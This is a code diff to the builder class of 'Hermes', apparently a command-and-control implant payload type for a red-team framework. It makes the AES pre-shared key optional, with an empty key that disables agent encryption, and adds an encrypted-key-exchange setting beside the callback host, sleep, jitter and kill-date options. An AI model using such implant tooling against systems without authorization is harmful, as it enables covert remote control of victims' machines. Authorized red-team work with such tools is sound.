@@ -93,10 +93,22 @@ class Hermes(PayloadType):
         if "https" in callback_host or "wss" in callback_host:
             use_ssl = "true"
 
+        # Handle encrypted_exchange_check parameter
+        encrypted_exchange = params.get("encrypted_exchange_check", "T")
+        encrypted_exchange_bool = "true" if encrypted_exchange == "T" else "false"
+        
+        # Handle AESPSK - may be "none" or have enc_key
+        aespsk = params.get("AESPSK", {})
+        if isinstance(aespsk, dict) and "enc_key" in aespsk:
+            encoded_aes_key = aespsk["enc_key"]
+        else:
+            # No encryption - use empty key (agent will skip encryption)
+            encoded_aes_key = ""
+        
         # Common replacements for all profiles
         replacements = {
             "REPLACE_PAYLOAD_UUID": self.uuid,
-            "REPLACE_ENCODED_AES_KEY": params["AESPSK"]["enc_key"],
+            "REPLACE_ENCODED_AES_KEY": encoded_aes_key,
             "REPLACE_C2_PROFILE_TYPE": profile,
             "REPLACE_CALLBACK_HOST": callback_host.replace("https://","").replace("http://","").replace("wss://","").replace("ws://",""),
             "REPLACE_CALLBACK_PORT": params.get("callback_port", 443),
@@ -107,6 +119,7 @@ class Hermes(PayloadType):
             "REPLACE_SLEEP": params.get("callback_interval", 10),
             "REPLACE_JITTER": params.get("callback_jitter", 23),
             "REPLACE_KILL_DATE": params.get("killdate", "2099-01-01"),
+            "REPLACE_ENCRYPTED_EXCHANGE_CHECK": encrypted_exchange_bool,
         }
 
         # HTTP profile specific replacements
